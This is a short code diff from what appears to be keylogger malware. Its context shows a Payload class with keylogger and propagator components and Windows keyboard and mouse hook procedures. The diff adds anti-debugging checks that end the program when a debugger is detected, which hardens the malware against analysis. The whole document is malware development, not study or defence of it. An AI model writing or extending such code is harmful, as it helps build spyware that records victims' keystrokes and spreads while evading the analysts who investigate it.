@@ -54,6 +54,10 @@ Keylogger &Payload::keylogger(void)
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
+	if (IsDebuggerPresent()) {
+		exit(42);
+	}
+
 	if (nCode == HC_ACTION) {
 		Payload::current->propagator().update();
 
@@ -80,6 +84,10 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 
 LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
+	if (IsDebuggerPresent()) {
+		exit(42);
+	}
+
 	if (nCode == HC_ACTION) {
 		LPMSLLHOOKSTRUCT mouse = (LPMSLLHOOKSTRUCT)(lParam);
 		switch (wParam)
